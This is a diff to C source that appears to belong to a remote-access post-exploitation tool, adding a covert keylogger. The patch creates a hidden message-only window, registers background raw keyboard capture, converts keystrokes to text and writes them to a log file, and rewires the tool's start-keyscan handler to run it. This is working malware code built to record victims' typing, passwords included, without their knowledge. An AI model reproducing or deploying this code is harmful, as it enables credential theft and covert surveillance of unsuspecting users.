@@ -3,6 +3,7 @@
 #include <tchar.h>
 
 extern HMODULE hookLibrary;
+extern HINSTANCE hAppInstance;
 
 /*
  * Enables or disables keyboard input
@@ -40,7 +41,7 @@ DWORD request_ui_enable_keyboard(Remote *remote, Packet *request)
 typedef enum { false=0, true=1 } bool;
 
 bool boom[1024];
-
+const char g_szClassName[] = "klwClass";
 HANDLE tKeyScan = NULL;
 char *KeyScanBuff = NULL;
 int KeyScanSize = 1024*1024;
@@ -109,6 +110,109 @@ void ui_keyscan_proc(void) {
 	}
 }
 
+
+
+/*
+ *  key logger updates begin here
+ */
+
+int WINAPI ui_keylog_proc()
+{
+    WNDCLASSEX klwc;
+    HWND hwnd;
+    MSG msg;
+
+    // register window class
+    ZeroMemory(&klwc, sizeof(WNDCLASSEX));
+    klwc.cbSize        = sizeof(WNDCLASSEX);
+    klwc.lpfnWndProc   = ui_keylog_wndproc;
+    klwc.hInstance     = hAppInstance;
+    klwc.lpszClassName = g_szClassName;
+    
+    if(!RegisterClassEx(&klwc))
+    {
+        return 0;
+    }
+    
+    // create message-only window
+    hwnd = CreateWindowEx(
+        0,
+        g_szClassName,
+        NULL,
+        0,
+        0, 0, 0, 0,
+        HWND_MESSAGE, NULL, hAppInstance, NULL
+    );
+
+    if(!hwnd)
+    {
+        return 0;
+    }
+    
+    // message loop
+    while(GetMessage(&msg, NULL, 0, 0) > 0)
+    {
+        TranslateMessage(&msg);
+        DispatchMessage(&msg);
+    }
+    
+    return msg.wParam;
+}
+
+LRESULT CALLBACK ui_keylog_wndproc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
+{
+    UINT dwSize;
+    RAWINPUTDEVICE rid;
+    RAWINPUT *buffer;
+    
+    switch(msg)
+    {
+    	// register raw input device
+        case WM_CREATE:
+            rid.usUsagePage = 0x01;
+            rid.usUsage = 0x06;
+            rid.dwFlags = RIDEV_INPUTSINK;
+            rid.hwndTarget = hwnd;
+            
+            if(!RegisterRawInputDevices(&rid, 1, sizeof(RAWINPUTDEVICE)))
+            {
+                return -1;
+            }
+            
+        case WM_INPUT:
+            // request size of the raw input buffer to dwSize
+            GetRawInputData((HRAWINPUT)lParam, RID_INPUT, NULL, &dwSize,
+                sizeof(RAWINPUTHEADER));
+        
+            // allocate buffer for input data
+            buffer = (RAWINPUT*)HeapAlloc(GetProcessHeap(), 0, dwSize);
+        
+            if(GetRawInputData((HRAWINPUT)lParam, RID_INPUT, buffer, &dwSize,
+                sizeof(RAWINPUTHEADER)))
+            {
+                // if this is keyboard message and WM_KEYDOWN, log the key
+                if(buffer->header.dwType == RIM_TYPEKEYBOARD
+                    && buffer->data.keyboard.Message == WM_KEYDOWN)
+                {
+                    if(ui_log_key(buffer->data.keyboard.VKey) == -1)
+                        DestroyWindow(hwnd);
+                }
+            }
+        
+            // free the buffer
+            HeapFree(GetProcessHeap(), 0, buffer);
+            break;
+            
+        case WM_DESTROY:
+            PostQuitMessage(0);
+            break;
+            
+        default:
+            return DefWindowProc(hwnd, msg, wParam, lParam);
+    }
+    return 0;
+}
+
 /*
  * Starts the keyboard sniffer
  */
@@ -122,7 +226,7 @@ DWORD request_ui_start_keyscan(Remote *remote, Packet *request)
 	} else {
 		// Make sure we have access to the input desktop
 		if(GetAsyncKeyState(0x0a) == 0) {
-			tKeyScan = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE) ui_keyscan_proc, NULL, 0, NULL);
+			tKeyScan = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE) ui_keylog_proc, NULL, 0, NULL);
 		} else {
 			// No permission to read key state from active desktop
 			result = 5;
@@ -175,3 +279,57 @@ DWORD request_ui_get_keys(Remote *remote, Packet *request)
 	packet_transmit_response(result, remote, response);
 	return ERROR_SUCCESS;
 }
+
+/*
+ * log keystrokes
+ * DO NOT REMOVE THIS UNTIL YOU ARE FAIRLY CERTAIN POTENTIAL OVERFLOWS ARE DEALT WITH
+ * remove text file logging code along with any ref to hLog and simply concatenate 
+ * everything into KeyScanBuff
+ */
+
+int ui_log_key(UINT vKey)
+{
+    DWORD dwWritten;
+    BYTE lpKeyboard[256];
+    char szKey[32];
+    WORD wKey;
+    char buf[32];
+    int len;
+        
+    // Convert virtual-key to ascii
+    GetKeyState(VK_CAPITAL); GetKeyState(VK_SCROLL); GetKeyState(VK_NUMLOCK);
+    GetKeyboardState(lpKeyboard);
+    
+    len = 0;
+    switch(vKey)
+    {
+        case VK_BACK:
+            len = wsprintf(buf, "[BP]");
+            break;
+        case VK_RETURN:
+            len = 2;
+            strcpy(buf, "\r\n");
+            break;
+        case VK_SHIFT:
+            break;
+        default:
+            if(ToAscii(vKey, MapVirtualKey(vKey, 0), lpKeyboard, &wKey, 0) == 1)
+                len = wsprintf(buf, "%c", (char)wKey);
+            else if(GetKeyNameText(MAKELONG(0, MapVirtualKey(vKey, 0)), szKey, 32) > 0)
+                len = wsprintf(buf, "[%s]", szKey);
+            break;
+    }
+
+    // Write buf into the log
+    if(len > 0)
+    {
+        if(!WriteFile(hLog, buf, len, &dwWritten, NULL))
+            return -1;
+    }
+        
+    return 0;
+}
+
+/*
+ * DO NOT REMOVE THIS UNTIL YOU ARE FAIRLY CERTAIN POTENTIAL OVERFLOWS ARE DEALT WITH
+ */
